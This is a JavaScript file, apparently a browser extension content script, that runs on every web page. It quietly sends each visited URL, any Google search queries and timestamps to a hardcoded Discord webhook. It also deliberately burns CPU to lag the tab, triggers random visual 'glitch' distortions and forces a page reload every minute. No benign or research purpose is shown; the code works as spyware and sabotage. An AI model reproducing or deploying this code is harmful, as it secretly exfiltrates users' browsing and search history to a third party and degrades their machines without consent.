const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1351937979718959137/n4gj7STURnoohr5DCKzGE-nFHLp6U19b-jh7wQRSotlb-hogaJf_Ztf80s0BbZigAtGb";

function sendVisitToDiscord(url) {
  const now = new Date();
  const timestampLocal = now.toLocaleString();       
  const timestampISO = now.toISOString();             

  const parsedURL = new URL(url);
  const hostname = parsedURL.hostname;
  const pathname = parsedURL.pathname;
  const searchParams = parsedURL.searchParams;

  let title = `🌐 Visited ${hostname}`;
  let description = `🕒 Visited at ${timestampLocal}`;

  // Check for Google Search
  if (hostname.includes("google.") && pathname === "/search") {
    const query = searchParams.get("q");
    if (query) {
      title = `🔍 Searched "${query}" on ${hostname}`;
      description += `\n🔗 Search: "${query}"`;
    }
  }

  const payload = {
    embeds: [
      {
        title: title,
        url: url,
        description: description,
        color: 0x00AE86,
        timestamp: timestampISO
      }
    ]
  };

  fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  }).catch(err => {
    console.error("❌ Failed to send to Discord:", err);
  });
}

// Only send once per page load
if (document.readyState === "complete" || document.readyState === "interactive") {
  if (window.location.href.startsWith("http")) {
    sendVisitToDiscord(window.location.href);
  }
} else {
  window.addEventListener("DOMContentLoaded", () => {
    if (window.location.href.startsWith("http")) {
      sendVisitToDiscord(window.location.href);
    }
  });
}

// --------- LAG SYSTEM (TOGGLE) ---------

const ENABLE_LAG = true; // Set to false to disable lag

const INTENSITY = 250; 
function burnTabCPU() {
  setInterval(() => {
    const end = Date.now() + INTENSITY;
    while (Date.now() < end) {
      Math.sqrt(Math.random() * Math.random());
    }
  }, 10);
}

if (ENABLE_LAG) {
  burnTabCPU();
}

// --------- GLITCH EFFECT ---------

function glitchUI() {
  const body = document.body;

  if (!document.getElementById('glitch-style')) {
    const style = document.createElement('style');
    style.id = 'glitch-style';
    style.textContent = `
      @keyframes glitch-shift {
        0% { transform: translate(0); filter: none; }
        20% { transform: translate(-2px, 2px) skew(0.5deg); filter: drop-shadow(2px 2px red); }
        40% { transform: translate(2px, -2px) skew(-0.5deg); filter: drop-shadow(-2px -2px cyan); }
        60% { transform: translate(-1px, 1px) skew(0.3deg); filter: drop-shadow(1px 1px magenta); }
        80% { transform: translate(1px, -1px) skew(-0.3deg); filter: drop-shadow(-1px -1px yellow); }
        100% { transform: translate(0); filter: none; }
      }
      .glitch-effect {
        animation: glitch-shift 0.3s ease-in-out;
        animation-iteration-count: 3;
        animation-direction: alternate;
      }
      .glitch-rgb {
        filter: url('#rgbShiftFilter');
      }
    `;
    document.head.appendChild(style);

    const svgFilter = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    svgFilter.innerHTML = `
      <filter id="rgbShiftFilter">
        <feColorMatrix in="SourceGraphic" type="matrix"
          values="1 0 0 0 0
                  0 1 0 0 0
                  0 0 1 0 0
                  0 0 0 1 0" result="normal"/>
        <feOffset in="normal" dx="2" dy="0" result="off1"/>
        <feOffset in="normal" dx="-2" dy="0" result="off2"/>
        <feBlend in="off1" in2="off2" mode="screen"/>
      </filter>
    `;
    document.body.appendChild(svgFilter);
  }

  body.classList.add('glitch-effect');
  setTimeout(() => {
    body.classList.remove('glitch-effect');
  }, 500);
}

function startRandomGlitch() {
  (function scheduleNext() {
    const delay = 30000 + Math.random() * 30000;
    setTimeout(() => {
      glitchUI();
      scheduleNext();
    }, delay);
  })();
}

startRandomGlitch();

// Automatically Refreshes the page every 1 minute or so
function startAutoRefresh() {
  setInterval(() => {
    location.reload();
  }, 60000); // 60,000 ms = 1 minute
}

startAutoRefresh();
